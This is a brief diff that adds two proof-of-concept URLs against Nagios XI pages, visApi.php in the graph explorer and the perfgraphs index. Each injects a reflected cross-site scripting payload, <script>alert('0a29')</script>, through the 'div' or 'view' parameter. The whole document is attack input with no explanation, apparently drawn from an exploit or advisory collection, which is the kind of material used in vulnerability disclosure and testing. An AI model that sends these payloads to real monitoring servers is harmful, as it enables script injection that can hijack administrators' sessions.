@@ -1,0 +1,3 @@
+http://www.example.com/nagiosxi/includes/components/graphexplorer/visApi.php?type=bar&div=</script><script>alert('0a29')</script>&opt=topalerts
+
+http://www.example.com/nagiosxi/perfgraphs/index.php?view='><script>alert('0a29')</script>&start=&end=&startdate=&enddate=
